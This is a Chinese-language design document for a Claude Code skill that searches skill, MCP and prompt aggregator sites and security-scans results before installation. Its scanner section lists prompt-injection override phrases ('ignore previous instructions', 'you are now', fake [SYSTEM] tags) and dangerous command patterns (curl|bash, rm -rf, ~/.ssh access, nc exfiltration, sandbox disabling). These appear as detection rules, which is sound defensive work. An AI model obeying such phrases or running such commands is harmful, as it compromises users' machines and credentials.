# /find-everything 设计文档

> 跨平台资源搜索编排器 — 一个 skill 搜遍所有 skill/MCP/prompt/开源项目聚合站

## 1. 背景与目标

### 问题

现有 `/find-skills` 只能搜索 skills.sh 一个平台。但市面上聚合 skill/MCP/prompt 的网站远不止一个，用户不可能知道所有平台的所有内容。

### 目标

构建 `/find-everything` skill，作为跨平台资源搜索的统一入口：

- **需求驱动搜索**（优先）：用户带着具体需求，skill 跨站搜索匹配结果
- **发现型浏览**（后续增强）：定期或按需扫描各站热门/新增内容，主动推荐
- **发现未知**：通过 WebSearch 兜底发现不在注册表中的新资源

### 核心原则

- 编排器思维：调用已有 skill/CLI/WebSearch，不重复造轮子
- API/CLI 优先：有稳定接口的用接口，没有的用 WebSearch
- 安全第一：所有结果经安全评估，安装前深度扫描

## 2. 架构总览

```
用户输入（显式/自动检测/主动推荐）
   ↓
┌──────────────────────────────────────┐
│  SKILL.md (find-everything)          │  ← 编排器
│  1. 意图分类（skill/mcp/prompt/repo）  │
│  2. 路由到对应搜索源                   │
│  3. 结果评估 + 安全快筛               │
│  4. 汇总 + 去重 + 排序 + 推荐         │
└──────────────┬───────────────────────┘
               ↓
┌──────────────────────────────────────┐
│  references/registry.json            │  ← 搜索源注册表
└──────────────┬───────────────────────┘
               ↓
   ┌───────────┼───────────┐
   ↓           ↓           ↓
 Tier 1      Tier 2      Tier 3
 已有skill   WebSearch   WebSearch
 + CLI       site:限定    广域搜索
```

### 文件结构

```
~/.claude/skills/find-everything/
├── SKILL.md                    # 编排逻辑（触发、分类、路由、汇总、推荐）
├── scripts/
│   └── security_scan.py        # 确定性安全检查（正则+模式匹配）
└── references/
    ├── registry.json            # 搜索源注册表
    ├── security-checklist.md    # LLM 安全评估指南
    └── known_skills.txt         # 知名 skill 名称列表（typosquat 检测用）
```

### 分工

| 文件 | 职责 |
|---|---|
| SKILL.md | 触发检测、查询分类、调用搜索、Tier 3 兜底、结果排序推荐、主动推荐 |
| security_scan.py | 确定性安全检查：正则模式匹配、typosquat 检测、反混淆、危险操作检测 |
| registry.json | 集中管理搜索源元数据，新增/修改站点只改此文件 |
| security-checklist.md | LLM 安全评估参考：误报过滤、上下文分析、量化评分体系 |

## 3. 搜索源注册表（registry.json）

### 类别定义

| 类别 | 说明 |
|---|---|
| skill | Agent Skills（Claude Code / AI Agent 可安装技能） |
| mcp | MCP Servers（Model Context Protocol 服务器） |
| prompt | 提示词模板/角色扮演/图片生成 |
| repo | GitHub 开源项目 |

### 搜索源清单

**Tier 1 — CLI/API/已有 Skill（快、准、零额外 token）：**

| ID | 名称 | 类别 | 搜索方式 | 依赖 |
|---|---|---|---|---|
| skills-sh | Skills.sh | skill | `npx skills find {query}` | npx |
| clawhub | ClawHub | skill | `clawhub search {query}` | clawhub CLI (`npm i -g clawhub`) |
| prompts-chat-prompts | Prompts.chat (提示词) | prompt | MCP tool `search_prompts` | prompts.chat MCP server |
| prompts-chat-skills | Prompts.chat (Skills) | skill | MCP tool `search_skills` | prompts.chat MCP server |
| skill-finder | Skill Finder (多源索引) | skill | 已安装的 skill-finder skill | aktsmm/agent-skills@skill-finder |
| github | GitHub | repo, mcp, skill | `gh search repos {query} --sort stars --limit 10 --json name,owner,description,url,stargazersCount` | gh |

**Tier 2 — WebSearch + site: 限定（中速、中 token）：**

| ID | 名称 | 类别 | 搜索前缀 |
|---|---|---|---|
| skillhub-club | SkillHub | skill | `site:skillhub.club` |
| aiskillsshow | AI Skills Show | skill | `site:aiskillsshow.com` |
| mcpservers | MCPServers.org | mcp, skill | `site:mcpservers.org` |
| skillsmp | SkillsMP | skill | `site:skillsmp.com` |
| aishort | AI Short | prompt | `site:aishort.top` |
| nanoprompts | NanoPrompts | prompt | `site:nanoprompts.org` |
| aiart-pics | AI Art Pics | prompt | `site:aiart.pics` |
| localbanana | LocalBanana | prompt | `site:localbanana.io` |

**Tier 3 — WebSearch 广域（兜底、发现新资源）：** 不带 site: 限定的通用搜索。

### 注册表设计

- 每个源独立描述：id、名称、URL、类别（数组）、tier、搜索方式、依赖
- `enabled` 开关：站点下线或有问题可快速禁用
- `requires` + `install_hint`：标记依赖，缺失时提示安装
- `method` 四种类型：`cli`、`mcp`、`skill`、`web_search`
- 新增站点只需加一条记录

### 注册表 JSON 结构示例

```json
{
  "version": "1.0",
  "categories": {
    "skill": "Agent Skills（可安装技能）",
    "mcp": "MCP Servers",
    "prompt": "提示词模板/角色扮演/图片生成",
    "repo": "GitHub 开源项目"
  },
  "sources": [
    {
      "id": "skills-sh",
      "name": "Skills.sh",
      "url": "https://skills.sh",
      "category": ["skill"],
      "tier": 1,
      "method": "cli",
      "command": "npx skills find {query}",
      "requires": "npx",
      "enabled": true
    },
    {
      "id": "skillhub-club",
      "name": "SkillHub",
      "url": "https://www.skillhub.club",
      "category": ["skill"],
      "tier": 2,
      "method": "web_search",
      "search_prefix": "site:skillhub.club",
      "enabled": true
    }
  ]
}
```

### Tier 1 源与 skill-finder 去重说明

skill-finder（aktsmm/agent-skills）维护了一个 220+ skills 的本地索引，其内容与 skills-sh 等源有部分重叠。Step 8 去重逻辑会合并同名结果，保留安装量/star 最高的来源作为主展示，其余来源作为补充标注。

## 4. 搜索编排逻辑

### 4.1 触发条件

| 触发方式 | 说明 |
|---|---|
| 显式调用 | `/find-everything {query}` |
| 自动检测 | 用户说"有没有xxx工具"、"帮我找个xxx"、"有没有skill能..." |
| 主动推荐 | LLM 基于对话上下文启发式判断：用户持续在做某类任务且无相关 skill/MCP。这是 best-effort 的 LLM 启发式，非精确计数。同会话最多 1 次 |

### 4.2 完整执行流程

```
Step 1: 意图分类
  查询 → 判断类别 [skill] [mcp] [prompt] [repo]（可多选）
  模糊需求 → 多类别同时搜索
  提取核心关键词 + 类别限定词优化搜索词

Step 2: 路由
  读取 registry.json → 筛选该类别下所有 enabled 源
  检查 requires 是否满足 → 不可用的跳过并记录

Step 3: Tier 1 搜索
  在单条回复中发起多个独立 Bash/MCP tool 调用实现并行
  （Claude Code 支持同一回复中多个独立 tool call 并发执行）
  若并行不可用，按优先级顺序执行：skills-sh > github > clawhub > 其他

Step 4: 结果够吗？（轻量预判：基于标题/描述关键词匹配，非 Step 6 的完整 LLM 评估）
  判断标准：相关性优先于数量
  - ≥3 条标题/描述与查询高度匹配 → 跳到 Step 6（末尾注明"搜索更多源可能有更多结果"）
  - <3 条匹配，或结果虽多但匹配度低 → 继续 Tier 2

Step 5: Tier 2/3 搜索
  合并同类别 Tier 2 源为 1 次 WebSearch：
  "{query} skill site:skillhub.club OR site:aiskillsshow.com OR ..."
  若合并查询返回 <2 条结果，退回对 Top 2-3 优先源逐个 site: 搜索
  仍不足 → Tier 3 广域 WebSearch（不带 site:）

Step 6: 结果评估
  LLM 判断每条结果相关性：高/中/不相关
  Top 3-5 条高相关结果可选 WebFetch 补充详情

Step 7: 安全快筛
  元数据层面：来源可信度、安装量/star、typosquat 检查
  标注：✅ 可信 / ⚠️ 需注意 / 🚫 风险

Step 8: 去重 + 排序
  同一工具多源出现 → 合并，标注所有来源
  排序：相关度 > 安全等级 > 安装量/star

Step 9: 展示推荐
  结果列表 + 安全标注 + 推荐理由
  附：未覆盖的搜索源提示（依赖缺失时）

Step 10: 用户选择后
  "看看" → WebFetch 详情
  "安装" → 触发深度安全扫描（security_scan.py + LLM 评估）
  确认安全后执行

Step 11: 新站点发现（Tier 3 时）
  发现不在注册表中的优质站点 → 建议加入 registry.json
```

### 4.3 Tier 2 搜索优化

- **合并搜索**：同类别多个 Tier 2 源合并为 1 次 WebSearch（用 OR 连接多个 site:）
- **关键词优化**：从自然语言提取核心搜索词 + 类别限定词
- **智能阈值**：与 Step 4 统一 — ≥3 条高相关即可展示，不足时再扩展搜索

### 4.4 依赖缺失处理

- 不阻塞搜索，跳过不可用的源，用其他源补充
- 结果末尾附提示："安装 xxx 可覆盖更多搜索源"
- 同一依赖每会话只提示一次

## 5. 安全检查模块

### 5.1 设计原则

- 自建，不依赖外部安全 skill
- 参考已有安全 skill（skill-vetter、prompt-guard、clawhub-skill-vetting、clawsec）的最佳实践
- 确定性检查（Python 脚本）+ 上下文分析（LLM）双层架构

### 5.2 Layer 1: 安全快筛（所有搜索结果，Step 7）

元数据层面，零成本：
- 来源可信度：注册表内已知站点 > 未知站点
- 安装量/star 数：极低（<10）且账号新建 → 标记风险
- 名称 typosquat 检查：与知名 skill 编辑距离过近 → 标记风险

### 5.3 Layer 2: 深度安全扫描（用户选择安装时，Step 10）

#### security_scan.py 确定性检查

**文本预处理/反混淆：**
- base64 编码内容解码检查
- 零宽字符检测（U+200B/200C/200D/FEFF）
- URL 编码解码
- HTML/markdown 注释内隐藏内容提取

**Prompt Injection 检测（4 级分类）：**
- Critical: "ignore previous instructions", "you are now", "system prompt override", "forget everything above"
- High: 伪造角色标签 [SYSTEM]/[ADMIN]/[ROOT], "debug mode", "safety mode: off", HTML 注释隐藏指令
- Medium: 代码注释中的 agent 指令, "Note to AI:", base64 编码指令, CSS display:none 隐藏文本
- Medium: 社工类 "I'm the developer", 紧迫感制造, "the security check is broken"

**危险操作检测：**
- 危险命令: rm -rf, curl|bash, wget|sh, eval(), exec(), child_process, spawn
- 凭证文件访问: ~/.ssh, ~/.aws, ~/.env, .credentials
- 系统文件修改: .bashrc, .zshrc, crontab, /etc/
- 提权操作: sudo, chmod 777
- 数据外传模式: curl/wget/nc 向外部发送数据
- 沙箱禁用: dangerouslyDisableSandbox, --no-verify

**Typosquat 检测：**
- 与知名 skill 名称的编辑距离检查（参考列表维护在 `references/known_skills.txt`，从 skills.sh 热门 Top 100 + 常见 MCP 服务器名单初始化，定期更新）
- 同形字替换检测 (l/1, O/0, rn/m)

**权限范围评估：**
- 低风险: fileRead
- 中风险: fileWrite
- 高风险: network
- 极高风险: shell
- 危险组合标记: network + shell

**输出格式：** 结构化 JSON。示例：

```json
{
  "scan_target": "example-skill/SKILL.md",
  "findings": [
    {
      "category": "prompt_injection",
      "severity": "critical",
      "pattern": "ignore previous instructions",
      "location": {"line": 42, "context": "...ignore previous instructions and..."},
      "raw_match": "ignore previous instructions"
    },
    {
      "category": "dangerous_command",
      "severity": "high",
      "pattern": "curl|bash",
      "location": {"line": 78, "context": "curl https://... | bash"},
      "raw_match": "curl https://example.com/setup.sh | bash"
    }
  ],
  "summary": {
    "critical": 1,
    "high": 1,
    "medium": 0,
    "low": 0,
    "clean": false
  }
}
```

### 深度扫描的目标范围

不同资源类型，扫描目标不同：

| 资源类型 | 扫描目标 | 获取方式 |
|---|---|---|
| Skill (skills.sh/clawhub) | SKILL.md + scripts/ 目录 | 优先 WebFetch GitHub 源码；若仓库不可访问，尝试 `npx skills add` 安装到临时目录后读取 |
| MCP Server | package.json + 入口文件 | WebFetch npm/GitHub 页面 |
| GitHub Repo | README + 主要脚本文件 | `gh api` 获取仓库内容 |
| Prompt | 提示词文本本身 | 搜索结果中已包含 |

**限制：** 单次扫描最多处理 50KB 文本内容，超出则只扫描 SKILL.md + 入口文件。超时限制 30 秒。

#### LLM 上下文评估（参考 security-checklist.md）

**误报过滤：**
- "ignore previous instructions" 出现在安全文档中 → 不是攻击
- curl 用于下载公开资源 → 可能合理，看目标地址
- eval() 用于模板引擎 → 需看上下文

**量化评分（0-100 加权）：**

| 维度 | 权重 | 评分标准 |
|---|---|---|
| 来源可信度 | 0-25 | 已知平台 + 高安装量 = 满分 |
| 代码透明度 | 0-25 | 开源 + 可审查 = 满分 |
| 权限范围 | 0-20 | 权限最小化原则 |
| 网络风险 | 0-15 | 无外部调用最安全 |
| 社区信号 | 0-15 | star 数、维护频率、作者历史 |

**风险定级：**
- 80-100: ✅ 安全，可使用
- 60-79: ⚠️ 谨慎，建议审查后使用
- <60: 🚫 风险，不推荐

## 6. 展示格式

### 搜索结果

```
找到 N 个相关结果（来自 X 个源）

1. [skill 名称]  ✅ 可信
   来源: skills.sh | 安装量: 1.2K
   简介: ...
   ★ 推荐理由: ...

2. [skill 名称]  ⚠️ 需注意
   来源: WebSearch (skillhub.club) | star: 50
   简介: ...
   ⚠️ 来源非直接 API，建议安装前审查源码

未覆盖的搜索源: clawhub CLI（未安装）
安装后可搜索更多内容: npm i -g clawhub
```

### 深度安全扫描结果

```
安全检查结果 [skill 名称]:
- 安全评分: 85/100
- 来源可信度: 22/25（skills.sh，安装量 1.2K）
- 代码透明度: 20/25（GitHub 开源，最近更新 2 周前）
- 权限范围: 18/20（仅 fileRead + fileWrite）
- 网络风险: 12/15（无外部网络调用）
- 社区信号: 13/15（45 star，活跃维护）
- 风险等级: ✅ 安全
- 建议: 可以安装
```

## 7. 技术决策记录

| 决策 | 理由 |
|---|---|
| 编排器架构（不自建搜索引擎） | 大部分平台已有 CLI/skill，复用比自建更稳定、维护成本低 |
| Tier 分层搜索 | 平衡全面性和效率：Tier 1 覆盖 80% 场景且零额外 token |
| WebSearch + site: 作为 Tier 2 | 大部分站点是 SPA，WebFetch 无法获取内容，WebSearch 利用搜索引擎索引绕过此限制 |
| 自建安全模块 | 不依赖外部安全 skill 的质量和更新，完全自主可控 |
| Python 脚本做确定性检查 | 正则匹配比 LLM 更快更准确，节省 token |
| LLM 做上下文判断 | 误报过滤和综合评分需要理解语义，Python 无法胜任 |
| 注册表驱动 | 新增/禁用站点只改 JSON，不改代码 |
| 合并 WebSearch 请求 | 同类别多 site: 用 OR 合并为一次搜索，减少 API 调用 |

## 8. 错误处理

| 场景 | 处理方式 |
|---|---|
| CLI 命令超时（npx/gh/clawhub） | 单个命令 15 秒超时，超时跳过该源，继续其他源 |
| WebSearch 返回错误或限流 | 降级：跳过 Tier 2，仅展示 Tier 1 结果 + 提示用户稍后重试 |
| security_scan.py 崩溃或输出异常 | 退回 LLM-only 安全评估（参考 security-checklist.md），标记"自动扫描未完成" |
| 所有 Tier 1 源不可用 | 直接进入 Tier 2 WebSearch，展示时注明"主要搜索源暂不可用" |
| 所有搜索源均失败 | 告知用户搜索失败，建议检查网络或手动访问站点 |
| registry.json 读取失败 | 退回 SKILL.md 内硬编码的最小搜索源列表（skills-sh + github），不依赖外部文件 |

**整体原则：** 优雅降级，尽可能返回部分结果而非完全失败。每个失败的源在结果末尾简短标注。

## 9. 依赖与前置条件

### 必需

- npx（已安装）
- gh CLI（已安装）
- Python 3.8+（运行 security_scan.py）
- WebSearch 权限（已配置）

### 可选（增强搜索覆盖）

- clawhub CLI: `npm i -g clawhub`
- prompts.chat MCP server
- aktsmm/agent-skills@skill-finder skill

## 10. 未来扩展

按优先级排列：

1. **搜索结果缓存**（P1）：避免短时间内重复搜索同一关键词。实现时需考虑缓存存储位置（建议 `~/.claude/cache/find-everything/`）和 TTL（建议 24 小时）
2. **发现型浏览模式**（P2）：定期扫描各站热门/新增内容，生成推荐报告。依赖缓存机制
3. **注册表自动更新**（P3）：Tier 3 发现的新站点自动评估并加入注册表。依赖缓存 + 浏览模式
4. **安全规则更新**（P3）：定期从安全社区获取新的恶意模式
